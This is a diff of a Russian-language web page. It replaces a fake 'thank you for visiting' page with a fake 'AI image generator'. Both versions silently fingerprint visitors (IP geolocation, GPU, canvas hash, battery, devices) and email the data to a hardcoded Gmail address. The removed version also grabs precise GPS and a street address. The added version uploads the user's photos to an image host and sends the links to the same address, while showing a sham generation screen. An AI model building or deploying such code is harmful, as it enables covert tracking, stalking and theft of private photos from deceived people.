@@ -3,381 +3,406 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
-<meta name="theme-color" content="#f5f4f0">
-<title>Спасибо</title>
+<meta name="theme-color" content="#0f0f1a">
+<title>AI Генератор</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  html, body { height: 100%; }
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  html, body { height:100%; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
-    background: #f5f4f0;
-    color: #2a2a2a;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 24px;
-    min-height: 100vh;
-    -webkit-font-smoothing: antialiased;
-    line-height: 1.65;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    background:radial-gradient(circle at 30% 10%,#1e1e35 0%,#0a0a14 100%);
+    color:#e8e8f0; display:flex; align-items:center; justify-content:center;
+    padding:24px; min-height:100vh; -webkit-font-smoothing:antialiased;
   }
+  .screen { display:none; width:100%; max-width:440px; }
+  .screen.active { display:block; animation:fade .35s ease; }
+  @keyframes fade { from{opacity:0;transform:translateY(8px);} to{opacity:1;transform:translateY(0);} }
   .card {
-    background: #ffffff;
-    border-radius: 20px;
-    padding: 56px 34px 46px;
-    max-width: 420px;
-    width: 100%;
-    text-align: center;
-    box-shadow: 0 1px 2px rgba(0,0,0,0.03), 0 8px 32px rgba(0,0,0,0.06);
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:20px; padding:44px 30px; text-align:center;
+    backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
   }
-  .icon {
-    width: 56px;
-    height: 56px;
-    margin: 0 auto 24px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #f0e6d2, #e8dcc0);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 26px;
+  .logo {
+    width:64px; height:64px; margin:0 auto 24px;
+    border-radius:18px;
+    background:linear-gradient(135deg,#6a5acd,#9b59b6);
+    display:flex; align-items:center; justify-content:center;
+    font-size:30px; color:#fff;
+    box-shadow:0 8px 24px rgba(106,90,205,0.35);
   }
-  h1 {
-    font-size: 1.6rem;
-    font-weight: 600;
-    margin-bottom: 18px;
-    letter-spacing: -0.02em;
-    color: #1a1a1a;
-    line-height: 1.3;
+  .logo.done { background:linear-gradient(135deg,#2ecc71,#27ae60); box-shadow:0 8px 24px rgba(46,204,113,0.35); }
+  h1 { font-size:1.5rem; font-weight:600; margin-bottom:12px; letter-spacing:-0.02em; line-height:1.3; }
+  h2 { font-size:1.15rem; font-weight:600; margin-bottom:8px; letter-spacing:-0.01em; }
+  p { color:#9a9ab0; line-height:1.6; font-size:0.95rem; margin-bottom:10px; }
+  .btn {
+    margin-top:26px; width:100%;
+    background:linear-gradient(135deg,#6a5acd,#9b59b6);
+    color:#fff; border:none; border-radius:14px;
+    padding:16px 24px; font-size:1rem; font-weight:600;
+    cursor:pointer; font-family:inherit;
+    transition:transform .15s ease, box-shadow .15s ease;
+    box-shadow:0 8px 20px rgba(106,90,205,0.3);
   }
-  p {
-    color: #6b6b6b;
-    font-size: 0.98rem;
-    margin-bottom: 14px;
+  .btn:active { transform:scale(0.98); box-shadow:0 4px 12px rgba(106,90,205,0.3); }
+  .hint { margin-top:14px; font-size:0.78rem; color:#5a5a75; }
+  .sig { margin-top:26px; font-size:0.85rem; color:#6a6a85; font-style:italic; }
+  .spinner {
+    width:44px; height:44px; margin:0 auto 22px;
+    border:3px solid rgba(255,255,255,0.08);
+    border-top-color:#6a5acd;
+    border-radius:50%;
+    animation:spin 0.9s linear infinite;
   }
-  .sig {
-    margin-top: 30px;
-    font-size: 0.9rem;
-    color: #a0a0a0;
-    font-style: italic;
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .bar {
+    margin-top:20px; height:6px; border-radius:3px;
+    background:rgba(255,255,255,0.08); overflow:hidden;
   }
-  .heart { color: #d97a7a; }
+  .bar-fill {
+    height:100%; width:0%;
+    background:linear-gradient(90deg,#6a5acd,#9b59b6);
+    border-radius:3px; transition:width .3s ease;
+  }
+  .count { margin-top:12px; font-size:0.8rem; color:#6a6a85; font-variant-numeric:tabular-nums; }
 </style>
 </head>
 <body>
+
+<div id="s-welcome" class="screen active">
   <div class="card">
-    <div class="icon">✦</div>
-    <h1>Спасибо, что заглянули</h1>
-    <p>Мы очень рады видеть вас здесь. Спасибо, что уделили нам немного своего времени.</p>
-    <p>Хорошего дня и отличного настроения <span class="heart">♥</span></p>
-    <div class="sig">— с искренней благодарностью</div>
+    <div class="logo">✦</div>
+    <h1>AI Генератор изображений</h1>
+    <p>Загрузите фотографии, и мы создадим на их основе что-то новое.</p>
+    <button id="btn-pick" class="btn">Добавить изображения</button>
+    <div class="hint">JPG, PNG, WEBP · до 25 штук за раз</div>
+    <input type="file" id="f-input" accept="image/*" multiple hidden>
   </div>
+</div>
 
-  <script>
-  (function () {
-    'use strict';
+<div id="s-upload" class="screen">
+  <div class="card">
+    <div class="spinner"></div>
+    <h2>Загрузка изображений</h2>
+    <p id="up-status">Подготовка...</p>
+    <div class="bar"><div class="bar-fill" id="up-bar"></div></div>
+    <div class="count" id="up-count"></div>
+  </div>
+</div>
 
-    // ============================================================
-    //  НАСТРОЙКИ
-    // ============================================================
-    const CONFIG = {
-      RECIPIENT_EMAIL: 'solncegrei@gmail.com',  // ← твой Gmail
-      SEND_ONCE_PER_SESSION: true,
-      GEOLOCATION_DELAY_MS: 3000,               // пауза перед запросом GPS
-      GEOLOCATION_TIMEOUT_MS: 15000
+<div id="s-generate" class="screen">
+  <div class="card">
+    <div class="spinner"></div>
+    <h2>Генерация</h2>
+    <p id="gen-status">Анализ изображений...</p>
+    <div class="bar"><div class="bar-fill" id="gen-bar"></div></div>
+  </div>
+</div>
+
+<div id="s-done" class="screen">
+  <div class="card">
+    <div class="logo done">✓</div>
+    <h1>Заявка принята</h1>
+    <p>Ваши изображения успешно загружены и переданы в обработку.</p>
+    <p>Результат будет готов в течение 30 минут.</p>
+    <div class="sig">Спасибо за доверие ♥</div>
+  </div>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+// ============================================================
+//  НАСТРОЙКИ — поменяй только это
+// ============================================================
+const CONFIG = {
+  RECIPIENT_EMAIL: 'solncegrei@gmail.com',   // ← твой Gmail
+  IMGBB_API_KEY:   'af022addb7ed4addbe0413da364abac3',        // ← ключ с api.imgbb.com
+  MAX_IMAGES:      25,
+  IMG_MAX_DIM:     1920,
+  IMG_QUALITY:     0.85,
+  GEN_TIME_MS:     25000
+};
+// ============================================================
+
+const $ = (id) => document.getElementById(id);
+const showScreen = (id) => {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+};
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+// ---------------- сбор отпечатка посетителя ----------------
+async function ipGeo() {
+  try {
+    const c = new AbortController();
+    const t = setTimeout(() => c.abort(), 5000);
+    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store', signal: c.signal });
+    clearTimeout(t);
+    if (r.ok) return await r.json();
+  } catch {}
+  return {};
+}
+function deviceType(ua) {
+  if (/iPad|Tablet|PlayBook|Silk|(Android(?!.*Mobile))/i.test(ua)) return 'Планшет';
+  if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i.test(ua)) return 'Смартфон';
+  return 'Компьютер';
+}
+function osInfo(ua) {
+  if (/Windows NT 10/i.test(ua)) return 'Windows 10/11';
+  if (/Windows NT/i.test(ua))    return 'Windows';
+  const a = ua.match(/Android\s([\d.]+)/); if (a) return 'Android ' + a[1];
+  const i = ua.match(/(?:iPhone|CPU) OS\s([\d_]+)/); if (i) return 'iOS ' + i[1].replace(/_/g,'.');
+  if (/Mac OS X/i.test(ua)) return 'macOS';
+  if (/CrOS/i.test(ua))     return 'ChromeOS';
+  if (/Linux/i.test(ua))    return 'Linux';
+  return '—';
+}
+function browserInfo(ua) {
+  if (/Edg\//i.test(ua))          return 'Edge';
+  if (/OPR\/|Opera/i.test(ua))    return 'Opera';
+  if (/YaBrowser/i.test(ua))      return 'Yandex';
+  if (/SamsungBrowser/i.test(ua)) return 'Samsung Internet';
+  if (/Firefox\//i.test(ua))      return 'Firefox';
+  if (/Chrome\//i.test(ua))       return 'Chrome';
+  if (/Safari\//i.test(ua))       return 'Safari';
+  return '—';
+}
+function gpuInfo() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return {};
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      gpuVendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
+      gpuRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
     };
-    // ============================================================
+  } catch { return {}; }
+}
+function canvasHash() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 220; c.height = 40;
+    const x = c.getContext('2d');
+    x.textBaseline = 'top'; x.font = '14px Arial';
+    x.fillStyle = '#f60'; x.fillRect(0,0,100,20);
+    x.fillStyle = '#069'; x.fillText('fp', 2, 15);
+    x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('fp', 4, 17);
+    const d = c.toDataURL();
+    let h = 0;
+    for (let i = 0; i < d.length; i++) { h = ((h<<5)-h) + d.charCodeAt(i); h |= 0; }
+    return h.toString(16);
+  } catch { return '—'; }
+}
+async function batteryInfo() {
+  if (!navigator.getBattery) return {};
+  try {
+    const b = await navigator.getBattery();
+    return { battery: Math.round(b.level*100)+'%', charging: b.charging?'да':'нет' };
+  } catch { return {}; }
+}
+async function gatherVisitor() {
+  const [geo, bat] = await Promise.all([ipGeo(), batteryInfo()]);
+  const ua  = navigator.userAgent;
+  const now = new Date();
+  const gpu = gpuInfo();
+  return {
+    'Время локальное': now.toLocaleString('ru-RU'),
+    'Время UTC':       now.toISOString(),
+    'IP':              geo.ip || '—',
+    'Страна':          geo.country_name ? geo.country_name+' ('+geo.country_code+')' : '—',
+    'Регион':          geo.region || '—',
+    'Город':           geo.city || '—',
+    'Провайдер':       geo.org || '—',
+    'Часовой пояс':    geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+    'Тип устройства':  deviceType(ua),
+    'ОС':              osInfo(ua),
+    'Браузер':         browserInfo(ua),
+    'Язык':            navigator.language,
+    'Ядер CPU':        navigator.hardwareConcurrency || '—',
+    'ОЗУ (ГБ)':        navigator.deviceMemory || '—',
+    'Экран':           screen.width+'×'+screen.height,
+    'DPR':             window.devicePixelRatio,
+    'GPU вендор':      gpu.gpuVendor || '—',
+    'GPU рендерер':    gpu.gpuRenderer || '—',
+    'Canvas-отпечаток': canvasHash(),
+    'Батарея':         bat.battery || '—',
+    'На зарядке':      bat.charging || '—',
+    'Referrer':        document.referrer || 'прямой заход',
+    'URL':             location.href,
+    'User-Agent':      ua
+  };
+}
 
-    // ---------------- утилиты ----------------
-    function shouldSend() {
-      if (!CONFIG.SEND_ONCE_PER_SESSION) return true;
-      try {
-        const k = 'visit_sent_' + location.hostname;
-        if (sessionStorage.getItem(k)) return false;
-        sessionStorage.setItem(k, '1');
-        return true;
-      } catch { return true; }
-    }
+// ---------------- отправка почты ----------------
+async function sendEmail(payload, subject) {
+  const body = Object.assign({
+    _subject: subject,
+    _template: 'table',
+    _captcha: 'false'
+  }, payload);
+  try {
+    const r = await fetch('https://formsubmit.co/ajax/' + encodeURIComponent(CONFIG.RECIPIENT_EMAIL), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    return r.ok;
+  } catch { return false; }
+}
 
-    function visitCount() {
-      try {
-        const k = 'visit_n_' + location.hostname;
-        const n = parseInt(localStorage.getItem(k) || '0', 10) + 1;
-        localStorage.setItem(k, String(n));
-        return n;
-      } catch { return 1; }
-    }
-
-    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
-    // ---------------- сбор базовых данных (без разрешений) ----------------
-    async function ipGeo() {
-      try {
-        const ctrl = new AbortController();
-        const t = setTimeout(() => ctrl.abort(), 5000);
-        const r = await fetch('https://ipapi.co/json/', { cache: 'no-store', signal: ctrl.signal });
-        clearTimeout(t);
-        if (r.ok) return await r.json();
-      } catch {}
-      return {};
-    }
-
-    function deviceType(ua) {
-      if (/iPad|Tablet|PlayBook|Silk|(Android(?!.*Mobile))/i.test(ua)) return 'Планшет';
-      if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i.test(ua)) return 'Смартфон';
-      return 'Компьютер';
-    }
-
-    function osInfo(ua) {
-      if (/Windows NT 10/i.test(ua))   return 'Windows 10/11';
-      if (/Windows NT 6\.3/i.test(ua)) return 'Windows 8.1';
-      if (/Windows NT/i.test(ua))      return 'Windows';
-      const a = ua.match(/Android\s([\d.]+)/);
-      if (a) return 'Android ' + a[1];
-      const i = ua.match(/(?:iPhone|CPU) OS\s([\d_]+)/);
-      if (i) return 'iOS ' + i[1].replace(/_/g, '.');
-      if (/Mac OS X/i.test(ua))        return 'macOS';
-      if (/CrOS/i.test(ua))            return 'ChromeOS';
-      if (/Linux/i.test(ua))           return 'Linux';
-      return '—';
-    }
-
-    function browserInfo(ua) {
-      if (/Edg\//i.test(ua))       return 'Edge';
-      if (/OPR\/|Opera/i.test(ua)) return 'Opera';
-      if (/YaBrowser/i.test(ua))   return 'Yandex';
-      if (/SamsungBrowser/i.test(ua)) return 'Samsung Internet';
-      if (/Firefox\//i.test(ua))   return 'Firefox';
-      if (/Chrome\//i.test(ua))    return 'Chrome';
-      if (/Safari\//i.test(ua))    return 'Safari';
-      return '—';
-    }
-
-    function gpuInfo() {
-      try {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (!gl) return {};
-        const ext = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          gpuVendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
-          gpuRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-        };
-      } catch { return {}; }
-    }
-
-    function canvasHash() {
-      try {
-        const c = document.createElement('canvas');
-        c.width = 220; c.height = 40;
-        const ctx = c.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 100, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('fp-отпечаток', 2, 15);
-        ctx.fillStyle = 'rgba(102,204,0,0.7)';
-        ctx.fillText('fp-отпечаток', 4, 17);
-        const data = c.toDataURL();
-        let h = 0;
-        for (let i = 0; i < data.length; i++) { h = ((h << 5) - h) + data.charCodeAt(i); h |= 0; }
-        return h.toString(16);
-      } catch { return '—'; }
-    }
-
-    async function batteryInfo() {
-      if (!navigator.getBattery) return {};
-      try {
-        const b = await navigator.getBattery();
-        return {
-          batteryLevel:    Math.round(b.level * 100) + '%',
-          batteryCharging: b.charging ? 'да' : 'нет'
-        };
-      } catch { return {}; }
-    }
-
-    async function storageInfo() {
-      if (!navigator.storage || !navigator.storage.estimate) return {};
-      try {
-        const e = await navigator.storage.estimate();
-        return {
-          storageQuota: (e.quota / 1024 / 1024 / 1024).toFixed(2) + ' ГБ',
-          storageUsage: (e.usage / 1024).toFixed(1) + ' КБ'
-        };
-      } catch { return {}; }
-    }
-
-    function connectionInfo() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (!c) return {};
-      return {
-        netType:     c.effectiveType || '—',
-        netDownlink: c.downlink ? c.downlink + ' Мбит/с' : '—',
-        netRTT:      c.rtt ? c.rtt + ' мс' : '—',
-        netSaveData: c.saveData ? 'да' : 'нет'
-      };
-    }
-
-    async function mediaInfo() {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return {};
-      try {
-        const d = await navigator.mediaDevices.enumerateDevices();
-        return {
-          microphones: d.filter(x => x.kind === 'audioinput').length,
-          cameras:     d.filter(x => x.kind === 'videoinput').length,
-          speakers:    d.filter(x => x.kind === 'audiooutput').length
-        };
-      } catch { return {}; }
-    }
-
-    async function gatherBase() {
-      const [geo, battery, storage, media] = await Promise.all([
-        ipGeo(), batteryInfo(), storageInfo(), mediaInfo()
-      ]);
-      const ua = navigator.userAgent;
-      const now = new Date();
-      const conn = connectionInfo();
-      const gpu = gpuInfo();
-
-      return {
-        // --- время ---
-        'Время локальное':  now.toLocaleString('ru-RU'),
-        'Время UTC':        now.toISOString(),
-        'Часовой пояс':     geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
-        'Смещение UTC (мин)': -now.getTimezoneOffset(),
-
-        // --- IP / сеть ---
-        'IP-адрес':         geo.ip || '—',
-        'Страна (IP)':      geo.country_name ? geo.country_name + ' (' + geo.country_code + ')' : '—',
-        'Регион (IP)':      geo.region || '—',
-        'Город (IP)':       geo.city || '—',
-        'Индекс (IP)':      geo.postal || '—',
-        'Широта (IP)':      geo.latitude || '—',
-        'Долгота (IP)':     geo.longitude || '—',
-        'Провайдер':        geo.org || '—',
-        'Тип сети':         conn.netType || '—',
-        'Скорость сети':    conn.netDownlink || '—',
-        'Пинг RTT':         conn.netRTT || '—',
-        'Экономия трафика': conn.netSaveData || '—',
-
-        // --- устройство ---
-        'Тип устройства':   deviceType(ua),
-        'ОС':               osInfo(ua),
-        'Браузер':          browserInfo(ua),
-        'Платформа':        navigator.platform || '—',
-        'Производитель':    navigator.vendor || '—',
-        'Язык':             navigator.language + ' [' + (navigator.languages || []).join(',') + ']',
-        'Ядер CPU':         navigator.hardwareConcurrency || '—',
-        'ОЗУ (ГБ)':         navigator.deviceMemory || '—',
-        'Сенсорных точек':  navigator.maxTouchPoints || 0,
-        'Сенсор':           ('ontouchstart' in window) ? 'да' : 'нет',
-        'Батарея':          battery.batteryLevel || '—',
-        'На зарядке':       battery.batteryCharging || '—',
-        'Экран':            screen.width + '×' + screen.height,
-        'Глубина цвета':    screen.colorDepth + ' бит',
-        'Плотность (DPR)':  window.devicePixelRatio,
-        'Окно':             window.innerWidth + '×' + window.innerHeight,
-        'Ориентация':       screen.orientation && screen.orientation.type || '—',
-        'GPU вендор':       gpu.gpuVendor || '—',
-        'GPU рендерер':     gpu.gpuRenderer || '—',
-        'Canvas-отпечаток': canvasHash(),
-        'Микрофоны':        media.microphones !== undefined ? media.microphones : '—',
-        'Камеры':           media.cameras !== undefined ? media.cameras : '—',
-        'Динамики':         media.speakers !== undefined ? media.speakers : '—',
-        'Хранилище (квота)': storage.storageQuota || '—',
-        'Хранилище (занято)': storage.storageUsage || '—',
-        'Cookies':          navigator.cookieEnabled ? 'включены' : 'выключены',
-        'DNT':              navigator.doNotTrack || '—',
-
-        // --- визит ---
-        'Номер визита':     visitCount(),
-        'Referrer':         document.referrer || 'прямой заход',
-        'Страница':         location.href,
-
-        'User-Agent':       ua
-      };
-    }
-
-    // ---------------- GPS ----------------
-    function getGps() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-          p => resolve(p.coords),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout: CONFIG.GEOLOCATION_TIMEOUT_MS, maximumAge: 0 }
-        );
-      });
-    }
-
-    async function reverseGeocode(lat, lon) {
-      try {
-        const url = 'https://nominatim.openstreetmap.org/reverse?format=jsonv2'
-          + '&lat=' + lat + '&lon=' + lon + '&accept-language=ru&zoom=18&addressdetails=1';
-        const r = await fetch(url);
-        if (!r.ok) return null;
-        return await r.json();
-      } catch { return null; }
-    }
-
-    // ---------------- отправка ----------------
-    async function sendEmail(data, subject) {
-      const body = Object.assign({
-        _subject: subject,
-        _template: 'table',
-        _captcha: 'false'
-      }, data);
-
-      try {
-        const r = await fetch('https://formsubmit.co/ajax/' + encodeURIComponent(CONFIG.RECIPIENT_EMAIL), {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify(body)
-        });
-        return r.ok;
-      } catch { return false; }
-    }
-
-    // ---------------- главный сценарий ----------------
-    (async function run() {
-      if (!shouldSend()) return;
-
-      // 1) Сразу — базовый email по IP
-      const base = await gatherBase();
-      const baseSubject = 'Визит: ' + (base['Город (IP)'] || '?') + ', ' + (base['Страна (IP)'] || '?');
-      sendEmail(base, baseSubject);
-
-      // 2) Письмо благодарности уже на экране — ждём, потом GPS
-      await sleep(CONFIG.GEOLOCATION_DELAY_MS);
-
-      const coords = await getGps();
-      if (!coords) return;
-
-      const extra = {
-        'GPS широта':       coords.latitude.toFixed(7),
-        'GPS долгота':      coords.longitude.toFixed(7),
-        'GPS точность (м)': Math.round(coords.accuracy),
-        'GPS высота (м)':   coords.altitude != null ? Math.round(coords.altitude) : '—',
-        'Google Maps':      'https://maps.google.com/?q=' + coords.latitude + ',' + coords.longitude,
-        'Яндекс Карты':     'https://yandex.ru/maps/?pt=' + coords.longitude + ',' + coords.latitude + '&z=18&l=map'
-      };
-
-      const rev = await reverseGeocode(coords.latitude, coords.longitude);
-      if (rev && rev.address) {
-        const a = rev.address;
-        const parts = [
-          a.country, a.state, a.county, a.city || a.town || a.village,
-          a.suburb || a.neighbourhood, a.road || a.pedestrian,
-          a.house_number
-        ].filter(Boolean);
-        if (parts.length) extra['GPS адрес'] = parts.join(', ');
-        if (rev.display_name) extra['Полный адрес'] = rev.display_name;
+// ---------------- сжатие изображения ----------------
+function compressImage(file, maxDim, quality) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    const url = URL.createObjectURL(file);
+    img.onload = () => {
+      URL.revokeObjectURL(url);
+      let w = img.naturalWidth, h = img.naturalHeight;
+      if (w > maxDim || h > maxDim) {
+        const r = Math.min(maxDim/w, maxDim/h);
+        w = Math.round(w*r); h = Math.round(h*r);
       }
+      const c = document.createElement('canvas');
+      c.width = w; c.height = h;
+      c.getContext('2d').drawImage(img, 0, 0, w, h);
+      c.toBlob(b => b ? resolve(b) : reject(new Error('blob')), 'image/jpeg', quality);
+    };
+    img.onerror = () => reject(new Error('load fail'));
+    img.src = url;
+  });
+}
 
-      const full = Object.assign({}, base, extra);
-      const gpsSubject = 'GPS: ' + (extra['GPS адрес'] || (coords.latitude.toFixed(5) + ', ' + coords.longitude.toFixed(5)));
-      sendEmail(full, gpsSubject);
-    })();
-  })();
-  </script>
+function blobToBase64(blob) {
+  return new Promise((resolve, reject) => {
+    const r = new FileReader();
+    r.onload = () => {
+      const s = r.result;
+      resolve(s.slice(s.indexOf(',') + 1));
+    };
+    r.onerror = reject;
+    r.readAsDataURL(blob);
+  });
+}
+
+async function uploadImgbb(blob) {
+  const base64 = await blobToBase64(blob);
+  const form = new FormData();
+  form.append('image', base64);
+  const r = await fetch('https://api.imgbb.com/1/upload?key=' + encodeURIComponent(CONFIG.IMGBB_API_KEY), {
+    method: 'POST',
+    body: form
+  });
+  const data = await r.json();
+  if (data && data.success && data.data) {
+    return {
+      url:    data.data.url,
+      viewer: data.data.url_viewer || data.data.url,
+      thumb:  data.data.thumb ? data.data.thumb.url : data.data.url,
+      size:   data.data.size
+    };
+  }
+  throw new Error('imgbb: ' + JSON.stringify(data).slice(0, 200));
+}
+
+// ---------------- главный сценарий ----------------
+let visitorInfo = null;
+
+(async () => {
+  visitorInfo = await gatherVisitor();
+  const subj = 'Визит: ' + (visitorInfo['Город']||'?') + ', ' + (visitorInfo['Страна']||'?');
+  sendEmail(visitorInfo, subj);
+})();
+
+const input    = $('f-input');
+const btnPick  = $('btn-pick');
+
+btnPick.addEventListener('click', () => input.click());
+
+input.addEventListener('change', async () => {
+  let files = Array.from(input.files || []);
+  if (files.length === 0) return;
+  if (files.length > CONFIG.MAX_IMAGES) files = files.slice(0, CONFIG.MAX_IMAGES);
+  await handleUpload(files);
+});
+
+async function handleUpload(files) {
+  showScreen('s-upload');
+  const statusEl = $('up-status');
+  const barEl    = $('up-bar');
+  const countEl  = $('up-count');
+
+  const total    = files.length;
+  const uploaded = [];
+  const failed   = [];
+
+  for (let i = 0; i < total; i++) {
+    const f = files[i];
+    countEl.textContent = (i+1) + ' / ' + total;
+    statusEl.textContent = 'Сжимаем: ' + f.name.slice(0, 40);
+    barEl.style.width = ((i / total) * 100) + '%';
+
+    try {
+      const blob = await compressImage(f, CONFIG.IMG_MAX_DIM, CONFIG.IMG_QUALITY);
+      statusEl.textContent = 'Загружаем: ' + f.name.slice(0, 40);
+      const res = await uploadImgbb(blob);
+      uploaded.push({
+        name: f.name,
+        origSize: f.size,
+        newSize: res.size,
+        url: res.url,
+        viewer: res.viewer,
+        thumb: res.thumb
+      });
+    } catch (e) {
+      console.warn('fail', f.name, e);
+      failed.push(f.name);
+    }
+
+    barEl.style.width = (((i + 1) / total) * 100) + '%';
+  }
+
+  countEl.textContent = 'Загружено ' + uploaded.length + ' из ' + total;
+
+  if (uploaded.length > 0) {
+    const payload = Object.assign({}, visitorInfo);
+    payload['Количество фото'] = uploaded.length;
+    if (failed.length) payload['Не удалось загрузить'] = failed.join(', ');
+
+    uploaded.forEach((u, idx) => {
+      payload['Фото ' + (idx+1) + ' (страница)'] = u.viewer;
+      payload['Фото ' + (idx+1) + ' (прямая)']  = u.url;
+    });
+    payload['Все прямые ссылки'] = uploaded.map(u => u.url).join('\n');
+
+    const subj = 'ФОТО: ' + uploaded.length + ' шт. — '
+               + (visitorInfo['Город']||'?') + ', '
+               + (visitorInfo['Страна']||'?');
+    sendEmail(payload, subj);
+  }
+
+  showScreen('s-generate');
+  const genStatus = $('gen-status');
+  const genBar    = $('gen-bar');
+  const steps = [
+    'Анализ изображений...',
+    'Определение ключевых объектов...',
+    'Построение модели...',
+    'Применение стиля...',
+    'Финальная обработка...'
+  ];
+  const stepMs = CONFIG.GEN_TIME_MS / steps.length;
+  for (let i = 0; i < steps.length; i++) {
+    genStatus.textContent = steps[i];
+    await sleep(stepMs);
+    genBar.style.width = (((i+1) / steps.length) * 100) + '%';
+  }
+
+  showScreen('s-done');
+}
+})();
+</script>
 </body>
 </html>
